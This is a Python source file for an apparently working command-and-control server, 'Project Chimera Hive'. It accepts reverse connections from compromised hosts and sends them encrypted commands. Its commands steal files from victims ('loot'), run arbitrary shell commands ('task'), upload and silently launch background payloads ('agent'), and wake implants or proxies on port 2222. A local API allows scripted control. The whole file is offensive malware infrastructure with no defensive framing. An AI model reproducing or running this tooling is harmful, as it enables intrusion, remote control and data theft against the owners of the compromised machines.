#!/usr/bin/env python3
import socket, threading, sys, os, cmd, time, struct, base64, re, io
from contextlib import redirect_stdout
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

CHIMERA_KEY = b"CHIMERA_PROJECT_2026_SECRET_KEY!"
crypto = ChaCha20Poly1305(CHIMERA_KEY)
iv = bytes([0] * 12)
active_nodes = {}
node_counter = 0

def recvall(sock, n):
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet: return None
        data.extend(packet)
    return bytes(data)

class ChimeraHive(cmd.Cmd):
    intro = r"""
    ␛[1;31m
      ___ _   _ ___ __  __ ___ ___    _    
     / __| | | |_ _|  \/  | __| _ \  /_\   
    | (__| |_| || || |\/| | _||   / / _ \  
     \___|\___/|___|_|  |_|___|_|_\/_/ \_\ 
    ␛[0m
    [!] Project Chimera: Hive C2 Active. (V6 Arsenal Update)
    [!] API Listening on 127.0.0.1:9999
    """
    prompt = "\033[1;31mhive>\033[0m "

    def _execute_and_parse(self, conn, wrapper_cmd, success_msg):
        enc = crypto.encrypt(iv, wrapper_cmd.encode(), None)
        conn.sendall(struct.pack('!I', len(enc)) + enc)
        
        buffer = ""
        while "---CHIMERA_END---" not in buffer:
            raw = recvall(conn, 4)
            if not raw: break
            msglen = struct.unpack('!I', raw)[0]
            data = recvall(conn, msglen)
            buffer += crypto.decrypt(iv, data, None).decode('utf-8', 'ignore')
            
        try:
            match = re.search(r'---CHIMERA_START---\s*(.*?)\s*---CHIMERA_END---', buffer, re.DOTALL)
            if not match: return "[-] Execution failed. Markers not found."
            b64_data = match.group(1).replace('\r', '').replace('\n', '').strip()
            missing_padding = len(b64_data) % 4
            if missing_padding: b64_data += '=' * (4 - missing_padding)
            decoded_data = base64.b64decode(b64_data).decode('utf-8', 'ignore')
            return f"[+] {success_msg}\n{decoded_data}"
        except Exception as e:
            return f"[-] Parsing failed. Error: {e}"

    def do_nodes(self, arg):
        print("\n--- Active Chimera Nodes ---")
        if not active_nodes: print("No nodes currently connected.")
        for nid, info in active_nodes.items():
            print(f"[{nid}] {info['addr'][0]}:{info['addr'][1]} - Status: ALIVE")
        print("----------------------------\n")

    def do_spear(self, arg):
        if not arg: return print("[!] Usage: spear <ip>")
        print(f"[*] Throwing spear at {arg}:2222...")
        try:
            s = socket.socket(); s.settimeout(2); s.connect((arg, 2222))
            s.send(b"CHIMERA_WAKE"); s.close()
            print("[+] Spear delivered. Awaiting check-in...")
        except Exception as e: print(f"[-] Spear failed: {e}")

    def do_proxy(self, arg):
        if not arg: return print("[!] Usage: proxy <ip>")
        print(f"[*] Waking Hydra proxy on {arg}:2222...")
        try:
            s = socket.socket(); s.settimeout(2); s.connect((arg, 2222))
            s.send(b"HYDRA_WAKE"); s.close()
            print("[+] Proxy Wake delivered.")
        except Exception as e: print(f"[-] Wake failed: {e}")

    def do_loot(self, arg):
        args = arg.split()
        if len(args) != 2: return print("[!] Usage: loot <id> <filepath>")
        nid, filepath = int(args[0]), args[1]
        if nid not in active_nodes: return print("[!] Invalid node ID.")
        
        print(f"[*] Tasking Node {nid} to loot: {filepath}")
        wrapper = f"python3 -c \"import base64; print('---CHIMERA_' + 'START---'); print(base64.b64encode(open('{filepath}', 'rb').read()).decode('utf-8')); print('---CHIMERA_' + 'END---')\"\n"
        result = self._execute_and_parse(active_nodes[nid]['conn'], wrapper, "Extracted File Content:")
        print(result)

    def do_task(self, arg):
        args = arg.split(maxsplit=1)
        if len(args) < 2: return print("[!] Usage: task <id> <raw bash command>")
        nid, cmd = int(args[0]), args[1]
        if nid not in active_nodes: return print("[!] Invalid node ID.")
        
        print(f"[*] Executing raw task on Node {nid}: {cmd}")
        b64_cmd = base64.b64encode(cmd.encode()).decode()
        wrapper = f"python3 -c \"import subprocess, base64; print('---CHIMERA_' + 'START---'); out=subprocess.getoutput(base64.b64decode('{b64_cmd}').decode()); print(base64.b64encode(out.encode()).decode()); print('---CHIMERA_' + 'END---')\"\n"
        result = self._execute_and_parse(active_nodes[nid]['conn'], wrapper, f"Task '{cmd}' Output:")
        print(result)

    def do_agent(self, arg):
        args = arg.split(maxsplit=2)
        if len(args) < 3: return print("[!] Usage: agent <id> <local_file> <remote_path>")
        nid, local_file, remote_path = int(args[0]), args[1], args[2]
        if nid not in active_nodes: return print("[!] Invalid node ID.")
        
        try:
            with open(local_file, 'rb') as f: payload = base64.b64encode(f.read()).decode()
        except Exception as e: return print(f"[-] Failed to read local agent file: {e}")

        print(f"[*] Deploying agent {local_file} to Node {nid} at {remote_path}...")
        wrapper = f"python3 -c \"import base64, os, subprocess; open('{remote_path}', 'wb').write(base64.b64decode('{payload}')); os.chmod('{remote_path}', 0o777); subprocess.Popen(['{remote_path}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); print('---CHIMERA_' + 'START---'); print(base64.b64encode(b'Agent Deployed and Detached in Background').decode()); print('---CHIMERA_' + 'END---')\"\n"
        result = self._execute_and_parse(active_nodes[nid]['conn'], wrapper, "Agent Deployment Status:")
        print(result)

    def do_clear(self, arg): os.system('clear')
    def do_exit(self, arg): print("[*] Shutting down..."); os._exit(0)

def listener_thread():
    global node_counter
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("0.0.0.0", 4445)); s.listen(5)
    while True:
        conn, addr = s.accept()
        node_counter += 1
        active_nodes[node_counter] = {'conn': conn, 'addr': addr}
        print(f"\n\n[+] GHOST SHELL SECURED: {addr[0]} connected as Node {node_counter}.")
        print("\033[1;31mhive>\033[0m ", end="", flush=True)

def api_thread(hive_inst):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("127.0.0.1", 9999)); s.listen(5)
    while True:
        try:
            conn, addr = s.accept()
            data = conn.recv(4096).decode('utf-8').strip()
            if data:
                f = io.StringIO()
                with redirect_stdout(f): hive_inst.onecmd(data)
                conn.sendall(f.getvalue().encode('utf-8'))
            conn.close()
        except: pass

if __name__ == '__main__':
    hive_instance = ChimeraHive()
    threading.Thread(target=listener_thread, daemon=True).start()
    threading.Thread(target=api_thread, args=(hive_instance,), daemon=True).start()
    time.sleep(0.5)
    try: hive_instance.cmdloop()
    except KeyboardInterrupt: os.system("stty sane"); os._exit(0)
